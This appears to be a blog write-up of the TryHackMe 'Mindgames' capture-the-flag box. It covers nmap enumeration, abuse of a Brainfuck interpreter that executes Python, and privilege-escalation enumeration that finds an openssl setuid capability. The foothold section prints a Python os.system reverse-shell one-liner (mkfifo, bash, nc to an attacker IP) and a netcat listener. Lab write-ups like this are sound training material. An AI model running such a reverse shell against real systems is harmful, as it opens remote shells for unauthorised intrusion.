---
title: Mindgames
tags: THM ctf linux
article_header:
  type: cover
published: true
author: krill
---
Just a terrible idea...

<!--more-->

## Enumeration

So much emphasis on enumeration, it is the key to successfully exploit a box.
nmap scan: 

`nmap -F -sV -sC -r -n 10.10.163.89 --min-rate 1000` 

```bash
    ┌─[krill@anonsurf]─[~/Boxes/THM/mindgames]
    └──╼ $nmap -F -sV -sC -r -n 10.10.163.89 --min-rate 1000  
    Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-08 02:45 WAT
    Nmap scan report for 10.10.163.89
    Host is up (0.46s latency).
    Not shown: 98 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
    |   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
    |_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Mindgames.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 33.29 seconds
```

The nmap result shows that the box has 2 open ports; port 22 and 80, running an ssh server(OpenSSH 7.6p1) and an http server(Golang net/http).


### Golang net/http server [port: 80]
Visiting the webpage running on port 80, found some sort of esoteric programming; **Brainfuck** it is;  
![port 80](/images/THM/mindgames/page1.png)

`Brainfuck is an esoteric programming language created in 1993 by a Swiss physics student named Urban Müller, Brainfuck was an attempt to create a language with the smallest possible compiler` 

Also, right beneath, we've got a brainfuck code interpreter; Check it out!   
Pasting the Fibonacci brainfuck code, gives what looks like a Fibonacci sequence of number. .  mmmm..  
![compiler](/images/THM/mindgames/page2.png)

Decoding this with [`dcode`](https://www.dcode.fr/brainfuck-language) gives us a python code; noice :ghost: 

```python
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))
``` 
now it's obvious uhn; let's pop a reverse shell with this ``python-netcat mega-combo oneliner``
:trollface:   
```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f")
```


## Exploitation
### Foothold: Initial access :bomb:
Since we know that the brainfuck interpreter executes any python code(in brainfuck) that we put into it, we can convert the above python reverse shell to brainfuck and execute it, using [`this site`](https://copy.sh/brainfuck/text.html).    

#### Listener: 
Create a netcat lilstener, to listen for incoming connections and also give us a shell.  
```bash
nc -lvnp 4444
```

#### Execution:
with the netcat listener running, paste the brainfuck-python reverse-shell code and run.  
you should get a shell just like this;  
```bash
┌─[krill@anonsurf]─[~/Boxes/THM/mindgames]
└──╼ $nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.2.126.43] from (UNKNOWN) [10.10.142.47] 49824
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
mindgames@mindgames:~/webserver$ 
```
we got a shell with a user with low priviledges, we need to escalate :triumph:

### Priviledge Escalation
#### Root Hunting: Vertical privEsc :arrow_up:

with the current user, we can check for possible privesc vectors; 

#### SUID Bits:
you can check for suid bits using the following command:
```bash
find / -type f -perm -u=s 2>/dev/null 
```
```bash
mindgames@mindgames:~/webserver$ find / -type f -perm -u=s 2>/dev/null
/bin/ping
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/newuidmap
```
looking through this, i didn't find any privesc vector(there most likely is, maybe a zeroday.) 

#### Capabilities:
wait a sec, what are capabilities? 
```text
Linux Capabilities are used to allow binaries (executed by non-root users) to perform privileged operations without providing them all root priviledges.
```
checking for capabilities with the following command, gave something interesting :bulb:  
```bash
getcap -r / 2>/dev/null
```
```bash   
mindgames@mindgames:~/webserver$  getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

ooph, we meet again `openssl cap_setuid+ep` :smirk_cat:   
i already wrote a post on how to exploit this capability to get a root shell~   
check [`it`](https://krill-x7.github.io/2022/05/08/linuxPrivEsc.html) out.

## Conclusion
finally, you made it to the end GG . 

_Sayonara~:beers:_



